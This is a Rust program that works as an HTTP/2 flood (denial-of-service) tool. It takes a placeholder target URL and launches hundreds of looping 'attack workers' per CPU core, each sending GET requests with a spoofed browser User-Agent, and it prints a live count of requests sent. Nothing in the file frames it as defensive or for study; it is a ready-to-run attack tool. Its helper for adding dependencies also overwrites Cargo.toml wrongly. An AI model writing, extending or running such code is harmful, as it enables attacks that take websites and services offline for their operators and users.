use reqwest::Client;
use std::sync::{Arc, atomic::{AtomicU64, Ordering}};
use tokio::task;
use tokio::time::{sleep, Duration};

const TARGET_URL: &str = "https://example.com"; // Change this
const THREADS_PER_CORE: usize = 500;
const UPDATE_INTERVAL: Duration = Duration::from_secs(1); // Console update every second

#[tokio::main]
async fn main() {
    check_and_install_deps(); // Ensure dependencies are installed

    let client = Arc::new(Client::builder()
        .http2_prior_knowledge()
        .build()
        .expect("Failed to create HTTP/2 client"));

    let total_requests = Arc::new(AtomicU64::new(0));

    // Start request counter monitor
    let monitor_requests = {
        let total_requests = Arc::clone(&total_requests);
        task::spawn(async move {
            loop {
                sleep(UPDATE_INTERVAL).await;
                println!("\rRequests Sent: {}", total_requests.load(Ordering::Relaxed));
            }
        })
    };

    // Launch attack workers
    let mut handles = Vec::new();
    for _ in 0..num_cpus::get() * THREADS_PER_CORE {
        let client = Arc::clone(&client);
        let total_requests = Arc::clone(&total_requests);

        let handle = task::spawn(async move {
            loop {
                let _ = client.get(TARGET_URL)
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                    .header("Connection", "keep-alive")
                    .send()
                    .await
                    .map(|_| total_requests.fetch_add(1, Ordering::Relaxed));
            }
        });

        handles.push(handle);
    }

    // Wait for all workers
    for handle in handles {
        handle.await.unwrap();
    }

    monitor_requests.await.unwrap();
}

/// Checks and installs missing dependencies automatically
fn check_and_install_deps() {
    let deps = [
        "reqwest = { version = \"0.11\", features = [\"http2\", \"rustls-tls\"] }",
        "tokio = { version = \"1\", features = [\"full\"] }",
        "num_cpus = \"1.16\""
    ];
    let cargo_toml = "Cargo.toml";

    if !std::path::Path::new(cargo_toml).exists() {
        return; // Skip if no Cargo.toml (should be a valid Rust project)
    }

    let content = std::fs::read_to_string(cargo_toml).unwrap_or_default();
    let mut modified = false;

    for dep in &deps {
        if !content.contains(dep) {
            std::fs::write(cargo_toml, format!("{}\n{}", content, dep)).unwrap();
            modified = true;
        }
    }

    if modified {
        println!("Installing missing dependencies...");
        std::process::Command::new("cargo")
            .arg("update")
            .spawn()
            .expect("Failed to install dependencies")
            .wait()
            .unwrap();
    }
}
